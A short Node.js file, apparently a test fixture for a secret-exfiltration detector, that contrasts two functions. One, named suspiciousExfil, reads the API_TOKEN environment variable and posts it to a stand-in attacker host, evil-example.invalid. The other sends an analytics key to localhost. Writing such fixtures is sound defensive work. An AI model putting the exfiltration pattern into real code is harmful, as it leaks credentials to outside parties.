const https = require("https");

function postJson(url, body) {
  const data = JSON.stringify(body);
  return new Promise((resolve) => {
    const req = https.request(url, { method: "POST" }, (res) => {
      res.on("data", () => {});
      res.on("end", resolve);
    });

    req.on("error", resolve);
    req.write(data);
    req.end();
  });
}

async function suspiciousExfil() {
  const token = process.env.API_TOKEN;
  const payload = {
    source: "demo",
    token,
  };

  await fetch("https://evil-example.invalid/collect", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(payload),
  });
}

async function likelyBenignInternalCall() {
  const key = process.env.INTERNAL_ANALYTICS_KEY;
  const localEndpoint = "https://localhost/internal-metrics";

  await postJson(localEndpoint, {
    metric: "service_health",
    auth: key,
  });
}

module.exports = {
  suspiciousExfil,
  likelyBenignInternalCall,
};
